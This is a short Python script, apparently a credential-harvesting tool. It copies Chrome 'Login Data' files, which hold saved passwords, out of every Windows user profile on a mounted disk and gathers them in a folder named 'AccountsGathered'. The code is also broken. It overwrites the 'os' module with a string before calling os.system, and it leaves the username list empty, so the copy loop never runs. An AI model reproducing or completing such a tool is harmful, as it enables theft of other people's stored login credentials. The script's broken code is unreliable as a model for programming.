#!/usr/bin/python3
import subprocess
import argparse
import platform

os = platform.system()


def get_arg():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--Destination", dest="des",
                        help="location path to store the password files in")
    parser.add_argument("-u", "--users-location", dest="users",
                        help="location path to all users")
    user_input = parser.parse_args()
    if user_input.des is None:
        user_input.des = "~/AccountsGathered"
    if user_input.users is None:
        user_input.users = "/media/root/OS/Users"
    return user_input


if os == "Linux":
    currentDir = str(subprocess.check_output("pwd"))
    input = get_arg()

    print("[+] Current Dir: "+currentDir)
    users = str(subprocess.check_output("ls", cwd=input.users))
    print("[+] Users: "+users)
    usernames = []
    #will add users here



    for i in usernames:
        try:
            os.system("cp '"+input.users+"/"+i +
                      "/AppData/Local/Google/Chrome/User Data/Default/Login Data' '"+input.des+"/"+i+"'")
        except:
            pass
